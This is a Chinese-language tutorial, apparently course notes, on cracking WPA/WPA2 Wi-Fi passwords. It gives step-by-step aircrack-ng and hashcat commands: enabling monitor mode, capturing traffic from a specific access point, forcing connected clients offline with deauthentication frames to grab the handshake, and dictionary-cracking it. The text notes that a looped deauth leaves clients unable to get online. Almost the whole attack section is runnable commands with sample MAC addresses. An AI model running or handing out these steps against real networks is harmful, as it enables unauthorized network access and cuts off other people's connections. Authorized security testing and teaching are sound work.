# WPA-hashcat渗透

严重声明:cpu加速都是幌子，aricrack-ng也用cpu，不然用爱跑的？

## 1.hashcat介绍

Hashcat系列软件是比较牛逼的密码破解软件,HashCat主要分为三个版本：Hashcat、oclHashcat-plus、oclHashcat-lite。

这三个版本的主要区别是：

HashCat只支持CPU破解。

oclHashcat-plus支持使用GPU破解多个HASH，并且支持的算法高达77种

oclHashcat-lite只支持使用GPU对单个HASH进行破解，支持的HASH种类仅有32种，但是对算法进行了优化，可以达到GPU破解的最高速度。

如果只有单个密文进行破解的话，推荐使用oclHashCat-lite。

## 2.渗透姿势

### 1.查看网卡

```
ip a
```

### 2.开启监听模式

```
airmon-ng start wlan0
```

### 3.扫描wifi

```
airodump-ng wlan0mon
```

### 4.抓包保存

```
airodump-ng wlan0mon -c 1 --bssid D8:24:BD:79:18:0B -w wpa-1 
-c:指定信道
--bssid:AP的MAC地址
-w:保存抓包结果
```

### 5.进行冲突模式攻击

将设备踢下线，当用户重连的时候，就会抓到握手包

```
aireplay-ng -0 5 -a D8:24:BD:79:18:0B -c 18:CC:18:C5:D5:64 wlan0mon
-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）
-a:设置 ap 的 mac
-c：设置已连接的合法客户端的 mac
```

### 6.重新连接wifi

获得握手包，用于破解

![image-20211201201536769](https://image.201068.xyz/assets/image-20211201201536769.png)

### 7.生成hccap文件

```
aircrack-ng wpa-1-01.cap -j wpahaccap
 -j <file>  : create Hashcat v3.6+ file (HCCAPX)
 -J <file>  : create Hashcat file (HCCAP)
```

### 8.破解

```
hashcat -m 2500 wpahaccap.hccapx /root/wifi/passwd.txt
-m:指定破解类型
2500:wpa/wpa2
```

![image-20211201201625121](https://image.201068.xyz/assets/image-20211201201625121.png)

### 9.再次查看密码

```
hashcat -m 2500 wpahaccap.hccapx --show
```

### 10.删除之前破解成功的记录

```
rm ~/.hashcat/hashcat.potfile
```

### 11.使用大字典

根本没有加速

```
hashcat -m 2500 wpahaccap.hccapx /root/wifi/pwd.txt
```

![image-20211201201735564](https://image.201068.xyz/assets/image-20211201201735564.png)

![image-20211201201746153](https://image.201068.xyz/assets/image-20211201201746153.png)

## 3.课后小结

参考：课后笔记